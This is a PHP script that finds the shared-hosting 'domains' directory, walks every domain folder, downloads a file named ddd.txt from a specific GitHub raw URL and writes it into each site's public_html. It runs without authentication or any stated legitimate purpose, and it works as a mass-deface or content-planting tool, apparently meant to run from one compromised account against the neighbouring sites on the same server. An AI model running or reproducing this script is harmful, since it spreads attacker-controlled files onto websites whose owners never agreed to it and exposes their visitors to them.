<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// URL of the file you want to download from GitHub
$githubFileUrl = 'https://raw.githubusercontent.com/youngkmd/youngkmd/refs/heads/main/ddd.txt';

// Function to list domains and allow uploading file to their public_html
function listDomainsAndUpload($dir, $fileUrl) {
    if (is_dir($dir)) {
        if ($handle = opendir($dir)) {
            echo "<h2>Contents of the folder: " . htmlspecialchars($dir) . "</h2>";
            echo "<ul>";
            while (false !== ($entry = readdir($handle))) {
                if ($entry != "." && $entry != "..") {
                    $domainPath = $dir . '/' . $entry;
                    echo "<li>";
                    if (is_dir($domainPath)) {
                        echo "<strong>" . htmlspecialchars($entry) . "</strong>";
                        
                        // Check if public_html exists and upload the file
                        $publicHtmlPath = $domainPath . '/public_html';
                        if (is_dir($publicHtmlPath)) {
                            echo " - Found public_html!";
                            
                            // Download the file from GitHub
                            $fileContent = file_get_contents($fileUrl);
                            
                            if ($fileContent) {
                                // Define the path where the file will be uploaded
                                $targetFilePath = $publicHtmlPath . '/ddd.txt';
                                
                                // Write the file to the public_html folder
                                file_put_contents($targetFilePath, $fileContent);
                                
                                echo " - File uploaded to: " . htmlspecialchars($targetFilePath);
                            } else {
                                echo " - Error: Could not download file from GitHub.";
                            }
                        } else {
                            echo " - public_html not found.";
                        }
                    }
                    echo "</li>";
                }
            }
            echo "</ul>";
            closedir($handle);
        }
    } else {
        echo "<p>This is not a valid directory.</p>";
    }
}

// Automatically detect the domains path
function getDomainsPath() {
    $fullPath = __FILE__;
    $directoryPath = dirname($fullPath);
    $directoryPath = str_replace('\\', '/', $directoryPath);
    $directoryPath = preg_replace('/^[A-Z]:/i', '', $directoryPath);
    $pathParts = explode('/', $directoryPath);
    $formattedPath = '/';
    foreach ($pathParts as $part) {
        if (!empty($part)) {
            $formattedPath .= $part . '/';
            if ($part === 'domains') {
                break;
            }
        }
    }
    return $formattedPath;
}

// Get the initial directory automatically
$initialDir = getDomainsPath();

// List the domains and upload the file
listDomainsAndUpload($initialDir, $githubFileUrl);
?>
